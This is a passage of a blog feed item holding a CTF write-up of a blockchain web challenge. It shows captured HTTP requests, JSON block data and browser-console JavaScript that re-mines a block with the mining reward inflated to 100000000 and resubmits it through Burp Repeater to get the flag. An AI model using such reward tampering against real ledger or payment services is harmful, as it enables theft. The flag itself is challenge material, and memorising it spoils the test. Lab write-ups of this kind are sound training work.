-Date: Tue, 29 May 2018 19:26:42 GMT
-
-{&quot;date&quot;: 1527622002.2765806, &quot;difficulty&quot;: 4, &quot;hash&quot;: &quot;&quot;, &quot;nonce&quot;: 0, &quot;previusHash&quot;: &quot;00001bdf900d3f92b946e058bcfa8a327d484b112e63746004b8e3d68d0768e7&quot;, &quot;transactions&quot;: [[&quot;e&quot;, &quot;a&quot;, 50], [&quot;minedReward&quot;, &quot;g&quot;, 1]]}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now miner sends the response using &lt;code class=&quot;highlighter-rouge&quot;&gt;sendblock&lt;/code&gt;.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;POST /sendblock HTTP/1.1
-Host:  
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
-Accept: */*
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http:// /user
-Content-Type: application/json
-Content-Length: 263
-Cookie: session=eyJ1c2VyIjoiZyJ9.De86bA._5mt5MP3jSvnrSa93vYjwjiywsA
-DNT: 1
-Connection: close
-
-{&quot;date&quot;:1527622002.2765806,&quot;difficulty&quot;:4,&quot;hash&quot;:&quot;000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939&quot;,&quot;nonce&quot;:11829,&quot;previusHash&quot;:&quot;00001bdf900d3f92b946e058bcfa8a327d484b112e63746004b8e3d68d0768e7&quot;,&quot;transactions&quot;:[[&quot;e&quot;,&quot;a&quot;,50],[&quot;minedReward&quot;,&quot;g&quot;,1]]}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Plan is simple, we’re going to transfer some amount of money, and manually using BurpSuite Repeater get the JSON block data using the &lt;code class=&quot;highlighter-rouge&quot;&gt;getblock&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;That’s the block we’re going to mine manually.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/blockchain-challenge/getblock.png&quot; alt=&quot;Getblock&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;{&quot;date&quot;: 1527622270.298562, &quot;difficulty&quot;: 4, &quot;hash&quot;: &quot;&quot;, &quot;nonce&quot;: 0, &quot;previusHash&quot;: &quot;000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939&quot;, &quot;transactions&quot;: [[&quot;g&quot;, &quot;b&quot;, 10], [&quot;minedReward&quot;, &quot;g&quot;, 1]]}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Firstly I wanted to do it in Python but as I was unsure that these values would parse in the same way as in JS, i decided to do it in browser console. Simply copy/paste the instructions code the source that was used to mine.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'{&quot;date&quot;: 1527622270.298562, &quot;difficulty&quot;: 4, &quot;hash&quot;: &quot;&quot;, &quot;nonce&quot;: 0, &quot;previusHash&quot;: &quot;000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939&quot;, &quot;transactions&quot;: [[&quot;g&quot;, &quot;b&quot;, 10], [&quot;minedReward&quot;, &quot;g&quot;, 1]]}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nl&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;1527622270.298562&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;nonce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;previusHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;transactions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;…&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hashed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;s2&quot;&gt;&quot;0000&quot;&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transactions&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;…&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;g&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;minedReward&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;g&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;__proto__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
-
-&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transactions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000000&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;100000000&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transactions&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;…&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;g&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;minedReward&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;g&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100000000&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-&lt;span class=&quot;err&quot;&gt;​&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;__proto__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hashed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;difficulty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nonce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strToHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;previusHash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;date&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;transactions&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nonce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;hashed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sha256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;strToHash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;s2&quot;&gt;&quot;00008b0833e08517be5dbc1fd645d188e747f8bd4fd170e6dead6696b7e10008&quot;&lt;/span&gt;
-&lt;span class=&quot;nx&quot;&gt;newBlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nonce&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;38925&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now we’re ready to send the new information through the repeater.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/blockchain-challenge/sendblock.png&quot; alt=&quot;Sendblocks&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;{&quot;date&quot;: 1527622270.298562, &quot;difficulty&quot;: 4, &quot;hash&quot;: &quot;00008b0833e08517be5dbc1fd645d188e747f8bd4fd170e6dead6696b7e10008&quot;, &quot;nonce&quot;: 38925, &quot;previusHash&quot;: &quot;000021492e9b9b756122db048705babd4cb3e3098a6afb1d33b9d842864d1939&quot;, &quot;transactions&quot;: [[&quot;g&quot;, &quot;b&quot;, 10], [&quot;minedReward&quot;, &quot;g&quot;, 100000000]]}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And here’s the flag!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;RSCTF_{F1RST_MILLION$$_U_H$VE_TO_STEAL}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-</description>
-        <pubDate>Sun, 03 Jun 2018 02:00:00 +0200</pubDate>
-        <link>http://localhost:4000/blockchain-challenge/</link>
-        <guid isPermaLink="true">http://localhost:4000/blockchain-challenge/</guid>
       </item>
     
   </channel>
